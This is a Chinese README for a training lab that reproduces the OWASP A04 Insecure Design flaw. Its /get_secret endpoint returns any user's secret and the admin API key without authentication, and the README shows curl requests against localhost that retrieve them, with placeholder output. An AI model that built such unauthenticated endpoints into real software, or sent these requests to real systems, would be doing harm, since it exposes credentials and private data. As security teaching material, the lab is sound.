# A04:2021 — 不安全设计（Insecure Design）

## 项目概述

本项目用于复现 **OWASP Top 10 A04: Insecure Design** 漏洞，模拟一个多用户、多角色的微型应用环境。漏洞核心：未验证用户身份和权限，任意 POST 请求即可获取敏感信息，包括 admin secret 和 API key。

该环境为零依赖 Python 标准库实现，不使用任何 pip 包，保证 Docker build 完全离线可行。

---

## 项目结构

```
A04_Insecure_Design/
│
├── environment/                 # 漏洞演示环境（Docker）
│   ├── app/                     
│   │   ├── app.py               
│   │   ├── data.json            
│   │   └── Dockerfile           
│   ├── web/                     
│   │   └── index.html           # 漏洞入口页面
│   └── docker-compose.yml       
│
├── exploit/                     # 自动化攻击脚本
│   ├── exploit.py               
│   ├── users.txt                
│   ├── requirements.txt         
│   └── README.md                
│
├── vulnerability/               
│   └── A04_Insecure_Design.md   # 渗透测试角度漏洞分析报告
│
├── screenshots/                 # 漏洞演示截图
│
└── README.md                    

```

---

## 环境配置说明

1. **提前拉取基础镜像**  
    在搭建环境前，请确保已经在本地拉取 Python slim 镜像：
    
    ```bash
    docker pull python:3.9-slim
    ```
    
2. **构建并启动环境**  
    在 `environment` 根目录下执行：
    
    ```bash
    docker builder prune -af
    docker compose build
    docker compose up
    ```
    
    > 注意：该环境完全使用标准库，无需 pip 下载任何依赖。
    
3. **访问方式**
    
    - 浏览器访问：[http://localhost:5000/](http://localhost:5000/)
        
    - curl 测试 POST 接口：
        
        Windows CMD 示例：
        
        ```cmd
        curl -X POST http://localhost:5000/get_secret -H "Content-Type: application/json" -d "{\"username\":\"admin\"}"
        ```
        
        PowerShell 示例：
        
        ```powershell
        curl -X POST http://localhost:5000/get_secret -H "Content-Type: application/json" -d '{"username":"admin"}'
        ```
        

---

## 漏洞说明

1. **漏洞类型**：未验证身份/权限导致敏感数据泄露
    
2. **漏洞体现**：
    
    - 任意 POST `/get_secret` 请求可获取任何用户的 secret 或 admin API key
        
    - 无需登录或认证
        
    - 多用户、多角色结构，可模拟横向移动攻击场景
        
3. **红队思维模拟点**：
    
    - 信息收集：扫描所有用户
        
    - 横向移动：通过 POST 请求获取其他用户敏感信息
        
    - 权限绕过：直接获取 admin secret 和 API key
        

---

## 漏洞复现示例

获取 admin secret：

```bash
curl -X POST http://localhost:5000/get_secret -H "Content-Type: application/json" -d '{"username":"admin"}'
```

返回结果：

```json
{
  "username": "admin",
  "role": "admin",
  "secret": "FLAG{super_secret_flag}",
  "api_key": "APIKEY-123456"
}
```

获取普通用户 secret：

```bash
curl -X POST http://localhost:5000/get_secret -H "Content-Type: application/json" -d '{"username":"alice"}'
```

返回结果：

```json
{
  "username": "alice",
  "role": "user",
  "secret": "user_secret_alice"
}
```

---

## 注意事项

- 请务必 **提前拉取 `python:3.9-slim` 镜像**，保证 Docker 构建稳定
